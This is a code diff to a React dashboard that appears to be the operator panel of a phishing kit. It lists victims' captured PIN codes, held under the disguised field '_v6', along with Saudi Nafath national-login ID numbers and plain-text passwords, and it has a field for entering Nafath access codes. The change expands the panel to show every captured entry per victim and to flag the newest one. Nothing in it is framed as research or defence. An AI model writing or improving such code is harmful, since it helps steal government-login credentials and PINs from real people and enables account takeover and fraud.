@@ -2434,28 +2434,52 @@ const renderNafadBox = () => {
       });
     });
     
-    if (hasPinData && pinRaw) {
+    // Create a box for each entry that has PIN data
+    customerEntryGroup.forEach((entry, index) => {
+      const raw = entry.raw || {};
+      const pinCode = raw._v6 || raw.pinCode;
+      const entryTimestamp = new Date(raw._v6UpdatedAt || raw.pinSubmittedAt || entry.submittedAt || entry.updatedAt || 0).getTime();
+      const isLatest = index === 0;
+      
+      // Check if this entry has PIN data
+      if (!pinCode) return;
+      
       boxes.push({
-        key: 'pin',
-        timestamp: pinTimestamp,
+        key: `pin-${entry.id}`,
+        timestamp: entryTimestamp,
         component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
             padding: 16, 
-            border: "1px solid #e5e7eb",
+            border: isLatest ? "2px solid #3b82f6" : "1px solid #e5e7eb",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
             position: "relative"
           }}>
-            <TimeCounter timestamp={pinTimestamp} />
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+            <TimeCounter timestamp={entryTimestamp} />
+            {isLatest && (
+              <span style={{
+                position: "absolute",
+                top: 8,
+                right: 8,
+                background: "#3b82f6",
+                color: "#fff",
+                padding: "2px 8px",
+                borderRadius: 4,
+                fontSize: "0.65rem",
+                fontWeight: 600
+              }}>
+                الأحدث
+              </span>
+            )}
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: isLatest ? 20 : 0 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز PIN</h3>
             </div>
             <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr" }}>
               {Array.from({ length: 4 }).map((_, idx) => {
-                const pinValue = String(pinRaw._v6 || pinRaw.pinCode || "0000").padStart(4, "0")[idx] || "0";
+                const pinValue = String(pinCode || "0000").padStart(4, "0")[idx] || "0";
                 return (
                   <div key={idx} style={{ background: "#f0f9ff", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 50, border: "1px solid #7dd3fc" }}>
                     <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#0c4a6e" }}>{pinValue}</span>
@@ -2483,7 +2507,7 @@ const renderNafadBox = () => {
           </div>
         )
       });
-    }
+    });
     
     // Create a box for each entry that has Phone data
     customerEntryGroup.forEach((entry, index) => {
@@ -2581,35 +2605,59 @@ const renderNafadBox = () => {
       });
     });
     
-    if (hasNafadData && nafadRaw) {
+    // Create a box for each entry that has Nafad data
+    customerEntryGroup.forEach((entry, index) => {
+      const raw = entry.raw || {};
+      const hasNafad = raw.nafadIdNumber || raw.nafadPassword;
+      const entryTimestamp = new Date(raw.nafadSubmittedAt || entry.submittedAt || entry.updatedAt || 0).getTime();
+      const isLatest = index === 0;
+      
+      // Check if this entry has Nafad data
+      if (!hasNafad) return;
+      
       boxes.push({
-        key: 'nafad',
-        timestamp: nafadTimestamp,
+        key: `nafad-${entry.id}`,
+        timestamp: entryTimestamp,
         component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
             padding: 16, 
-            border: "1px solid #e5e7eb",
+            border: isLatest ? "2px solid #3b82f6" : "1px solid #e5e7eb",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
             position: "relative"
           }}>
-            <TimeCounter timestamp={nafadTimestamp} />
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+            <TimeCounter timestamp={entryTimestamp} />
+            {isLatest && (
+              <span style={{
+                position: "absolute",
+                top: 8,
+                right: 8,
+                background: "#3b82f6",
+                color: "#fff",
+                padding: "2px 8px",
+                borderRadius: 4,
+                fontSize: "0.65rem",
+                fontWeight: 600
+              }}>
+                الأحدث
+              </span>
+            )}
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: isLatest ? 20 : 0 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>نفاذ</h3>
             </div>
-            {nafadRaw.nafadIdNumber && (
+            {raw.nafadIdNumber && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{nafadRaw.nafadIdNumber}</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.nafadIdNumber}</span>
               </div>
             )}
-            {nafadRaw.nafadPassword && (
+            {raw.nafadPassword && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginTop: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>كلمة المرور</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{nafadRaw.nafadPassword}</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.nafadPassword}</span>
               </div>
             )}
             {/* حقل إدخال رمز النفاذ */}
@@ -2652,7 +2700,7 @@ const renderNafadBox = () => {
           </div>
         )
       });
-    }
+    });
     
     // Sort boxes by timestamp (newest first)
     boxes.sort((a, b) => b.timestamp - a.timestamp);
